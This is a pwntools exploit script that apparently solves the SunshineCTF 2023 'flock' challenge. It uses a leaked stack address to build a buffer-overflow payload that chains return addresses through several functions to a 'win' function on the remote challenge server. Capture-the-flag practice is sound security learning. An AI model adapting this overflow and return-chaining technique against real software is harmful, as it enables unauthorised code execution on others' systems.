from pwn import *


context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./flock")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = process("./flock")
p = remote('chal.2023.sunshinectf.games', 23002)
#p = gdb.debug("./flock", '''
#b *main
#b *func5
#b *func5+75
#b *func5+104
#b *func4+28
#b *func3+28
#b *func2+28
#''')

# 136 bytes offset for valid address

size = 500
func5_valid = 0x401276
func4_valid = 0x4012a0
func4_stackBase = 0x401268
func3_valid = 0x4012ca
func2_valid = 0x4012f0
win = 0x4011b9

p.recvuntil("At ")
leak = int(p.recvn(14), 16)
valid_stackAddr = leak + 144
valid_stackAddr2 = leak + 160
valid_stackAddr3 = leak + 208
valid_stackAddr4 = leak + 176
valid_stackAddr5 = leak + 224
valid_stackAddr6 = leak + 256

print("leak: ", hex(leak))
print("valid stack address: ", hex(valid_stackAddr))

# 128 bytes padding for valid_address2
# 136 bytes padding for valid_address
padA = b'A' * 128
padB = b'B' * 8
junk = b'D' * 4
padC = b'C' * (size - (len(padA) - len(padB) - len(padB) - len(padB) - len(padB) - len(padB) - len(padB) - 32 - len(padB) - len(padB) - 8 - len(padB)))

payload = padA + p64(valid_stackAddr2) + p64(func5_valid) + p64(valid_stackAddr) + p64(func4_valid) + p64(valid_stackAddr3) + p64(func4_valid) + b'F' * 32 + p64(valid_stackAddr5) + p64(func3_valid) + b'G' * 8 + p64(func2_valid) + b'H' * 8 + p64(0x0000000000401016) + p64(win)

p.sendline(payload)


p.interactive()


